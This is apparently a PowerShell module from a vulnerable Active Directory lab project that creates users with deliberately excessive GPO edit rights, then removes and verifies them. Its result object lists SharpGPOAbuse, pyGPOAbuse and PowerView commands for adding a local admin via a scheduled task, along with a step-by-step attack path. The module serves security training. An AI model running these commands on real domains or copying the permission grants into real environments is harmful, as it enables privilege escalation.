#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys, removes, and tests GPO Abuse scenarios for VulnAD.

.DESCRIPTION
    This module creates Group Policy Objects with overly permissive delegation,
    allowing unprivileged users to modify GPOs linked to critical OUs. Attackers
    can leverage tools like SharpGPOAbuse to push malicious configurations such
    as local admin additions, scheduled tasks, or startup scripts.

    MITRE ATT&CK: T1484.001 - Domain Policy Modification: Group Policy Modification

.NOTES
    Module:     VulnAD
    Component:  GPO Abuse
    Author:     VulnAD Project
#>

# ---------------------------------------------------------------------------
# Helpers (imported from VulnAD-Core.ps1 at runtime)
# ---------------------------------------------------------------------------

function Deploy-GPOAbuse {
    <#
    .SYNOPSIS
        Deploys GPO abuse misconfiguration scenarios.
    .DESCRIPTION
        Creates users with edit/delete/modify permissions on GPOs linked to
        sensitive OUs, simulating a common Active Directory privilege escalation path.
    .PARAMETER Difficulty
        Scenario difficulty: Easy, Medium, or Hard.
    .PARAMETER DomainDN
        The distinguished name of the domain (e.g., DC=contoso,DC=com).
    .PARAMETER Domain
        The FQDN of the domain (e.g., contoso.com).
    .EXAMPLE
        Deploy-GPOAbuse -Difficulty Medium -DomainDN 'DC=lab,DC=local' -Domain 'lab.local'
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory)]
        [string]$DomainDN,

        [Parameter(Mandatory)]
        [string]$Domain
    )

    begin {
        $scenarioName = 'GPO Abuse'
        Write-VulnStatus -Message "Deploying $scenarioName scenario ($Difficulty)..." -Type Info
        $createdObjects = [System.Collections.Generic.List[string]]::new()
    }

    process {
        try {
            # ---------------------------------------------------------------
            # 1. Create Users
            # ---------------------------------------------------------------
            $pw1 = Get-VulnPassword -Difficulty $Difficulty -Index 0
            $pw2 = Get-VulnPassword -Difficulty $Difficulty -Index 1

            $user1 = New-VulnUser -SamAccountName 'b.foster' `
                                  -Name 'Brian Foster' `
                                  -Password $pw1 `
                                  -DomainDN $DomainDN `
                                  -Description 'IT Helpdesk'
            $createdObjects.Add("CN=Brian Foster,OU=Users,OU=ADMonolith,$DomainDN")

            $user2 = New-VulnUser -SamAccountName 'n.campbell' `
                                  -Name 'Nina Campbell' `
                                  -Password $pw2 `
                                  -DomainDN $DomainDN `
                                  -Description 'Systems Analyst'
            $createdObjects.Add("CN=Nina Campbell,OU=Users,OU=ADMonolith,$DomainDN")

            Write-VulnResult -Name 'b.foster' -Detail 'IT Helpdesk user created' -Success $true
            Write-VulnResult -Name 'n.campbell' -Detail 'Systems Analyst user created' -Success $true

            # ---------------------------------------------------------------
            # 2. Create GPOs and assign permissions
            # ---------------------------------------------------------------
            $gpo1 = $null
            $gpo2 = $null

            try {
                Import-Module GroupPolicy -ErrorAction Stop

                # GPO 1 — Workstation Settings
                $gpo1 = New-GPO -Name 'VulnAD-WorkstationSettings' -Comment 'VulnAD - Workstation baseline settings' -ErrorAction Stop
                $createdObjects.Add("GPO:VulnAD-WorkstationSettings")

                New-GPLink -Name 'VulnAD-WorkstationSettings' `
                           -Target "OU=ADMonolith,$DomainDN" `
                           -LinkEnabled Yes `
                           -ErrorAction Stop | Out-Null

                Set-GPPermission -Name 'VulnAD-WorkstationSettings' `
                                 -TargetName 'b.foster' `
                                 -TargetType User `
                                 -PermissionLevel GpoEditDeleteModifySecurity `
                                 -ErrorAction Stop | Out-Null

                Write-VulnResult -Name 'VulnAD-WorkstationSettings' `
                                 -Detail 'GPO created; b.foster granted GpoEditDeleteModifySecurity' `
                                 -Success $true

                # GPO 2 — Server Maintenance
                $gpo2 = New-GPO -Name 'VulnAD-ServerMaintenance' -Comment 'VulnAD - Server maintenance policy' -ErrorAction Stop
                $createdObjects.Add("GPO:VulnAD-ServerMaintenance")

                # Ensure target OU exists
                $serverOU = "OU=Servers,OU=ADMonolith,$DomainDN"
                try {
                    Get-ADOrganizationalUnit -Identity $serverOU -ErrorAction Stop | Out-Null
                }
                catch {
                    New-ADOrganizationalUnit -Name 'Servers' `
                                            -Path "OU=ADMonolith,$DomainDN" `
                                            -ProtectedFromAccidentalDeletion $false `
                                            -ErrorAction Stop
                    $createdObjects.Add($serverOU)
                }

                New-GPLink -Name 'VulnAD-ServerMaintenance' `
                           -Target $serverOU `
                           -LinkEnabled Yes `
                           -ErrorAction Stop | Out-Null

                Set-GPPermission -Name 'VulnAD-ServerMaintenance' `
                                 -TargetName 'n.campbell' `
                                 -TargetType User `
                                 -PermissionLevel GpoEdit `
                                 -ErrorAction Stop | Out-Null

                Write-VulnResult -Name 'VulnAD-ServerMaintenance' `
                                 -Detail 'GPO created; n.campbell granted GpoEdit' `
                                 -Success $true
            }
            catch [System.IO.FileNotFoundException] {
                Write-VulnStatus -Message 'GroupPolicy module not available. GPO creation skipped — install RSAT Group Policy tools.' -Type Warning
                Write-VulnResult -Name 'GPO Creation' -Detail 'GroupPolicy module not installed' -Success $false
            }
            catch {
                Write-VulnStatus -Message "GPO configuration failed: $_" -Type Error
                Write-VulnResult -Name 'GPO Creation' -Detail $_.Exception.Message -Success $false
            }

            Write-VulnResult -Name $scenarioName -Detail 'Deployment complete' -Success $true -IsLast

            # ---------------------------------------------------------------
            # 3. Build result object
            # ---------------------------------------------------------------
            $result = @{
                Scenario       = $scenarioName
                Description    = @(
                    'Brian Foster (b.foster) has GpoEditDeleteModifySecurity on VulnAD-WorkstationSettings GPO linked to OU=ADMonolith.'
                    'Nina Campbell (n.campbell) has GpoEdit on VulnAD-ServerMaintenance GPO linked to OU=Servers,OU=ADMonolith.'
                    'An attacker controlling either account can modify GPOs to push malicious configurations to all machines in the linked OU.'
                ) -join ' '
                CreatedObjects = $createdObjects.ToArray()
                AttackCommands = @(
                    "# SharpGPOAbuse — Add local admin via GPO"
                    "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount b.foster --GPOName 'VulnAD-WorkstationSettings'"
                    ""
                    "# SharpGPOAbuse — Add immediate scheduled task"
                    "SharpGPOAbuse.exe --AddComputerTask --TaskName 'VulnTask' --Author '$Domain\b.foster' --Command 'cmd.exe' --Arguments '/c net localgroup administrators b.foster /add' --GPOName 'VulnAD-WorkstationSettings'"
                    ""
                    "# pyGPOAbuse — Add local admin"
                    "python3 pygpoabuse.py '$Domain/b.foster:$pw1' -gpo-id $($gpo1.Id) -f -dc-ip <DC_IP>"
                    ""
                    "# PowerView — Enumerate GPO permissions"
                    "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { `$_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl' }"
                )
                AttackPath     = @(
                    '1. Enumerate GPOs with weak permissions (PowerView / BloodHound).'
                    '2. Identify GPOs linked to OUs containing target machines.'
                    '3. Use SharpGPOAbuse to add local admin or deploy a scheduled task.'
                    '4. Wait for Group Policy refresh (or force via gpupdate) on target machines.'
                    '5. Authenticate to target machine as the newly-added local admin.'
                )
                MitreID        = 'T1484.001'
                Difficulty     = $Difficulty
            }

            return $result
        }
        catch {
            Write-VulnStatus -Message "Failed to deploy $scenarioName scenario: $_" -Type Error
            throw
        }
    }
}

function Remove-GPOAbuse {
    <#
    .SYNOPSIS
        Removes all objects created by Deploy-GPOAbuse.
    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN
    )

    Write-VulnStatus -Message 'Removing GPO Abuse scenario...' -Type Info

    # Remove GPOs
    try {
        Import-Module GroupPolicy -ErrorAction Stop
        @('VulnAD-WorkstationSettings', 'VulnAD-ServerMaintenance') | ForEach-Object {
            try {
                Remove-GPO -Name $_ -ErrorAction Stop
                Write-VulnResult -Name $_ -Detail 'GPO removed' -Success $true
            }
            catch {
                Write-VulnResult -Name $_ -Detail "GPO removal failed: $_" -Success $false
            }
        }
    }
    catch {
        Write-VulnStatus -Message 'GroupPolicy module not available. Manual GPO cleanup required.' -Type Warning
    }

    # Remove users
    @('b.foster', 'n.campbell') | ForEach-Object {
        try {
            Remove-ADUser -Identity $_ -Confirm:$false -ErrorAction Stop
            Write-VulnResult -Name $_ -Detail 'User removed' -Success $true
        }
        catch {
            Write-VulnResult -Name $_ -Detail "User removal failed: $_" -Success $false
        }
    }

    Write-VulnResult -Name 'GPO Abuse' -Detail 'Cleanup complete' -Success $true -IsLast
}

function Test-GPOAbuse {
    <#
    .SYNOPSIS
        Validates that the GPO Abuse scenario is correctly deployed.
    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN
    )

    $results = @{}

    # Check users exist
    foreach ($sam in @('b.foster', 'n.campbell')) {
        try {
            Get-ADUser -Identity $sam -ErrorAction Stop | Out-Null
            $results[$sam] = $true
        }
        catch {
            $results[$sam] = $false
        }
    }

    # Check GPOs exist
    try {
        Import-Module GroupPolicy -ErrorAction Stop
        foreach ($gpoName in @('VulnAD-WorkstationSettings', 'VulnAD-ServerMaintenance')) {
            try {
                Get-GPO -Name $gpoName -ErrorAction Stop | Out-Null
                $results[$gpoName] = $true
            }
            catch {
                $results[$gpoName] = $false
            }
        }
    }
    catch {
        $results['GroupPolicyModule'] = $false
    }

    $allPassed = $results.Values -notcontains $false

    foreach ($key in $results.Keys) {
        $isLast = ($key -eq ($results.Keys | Select-Object -Last 1))
        Write-VulnResult -Name $key -Detail $(if ($results[$key]) { 'Exists' } else { 'Missing' }) `
                         -Success $results[$key] -IsLast:$isLast
    }

    return $allPassed
}

Export-ModuleMember -Function Deploy-GPOAbuse, Remove-GPOAbuse, Test-GPOAbuse

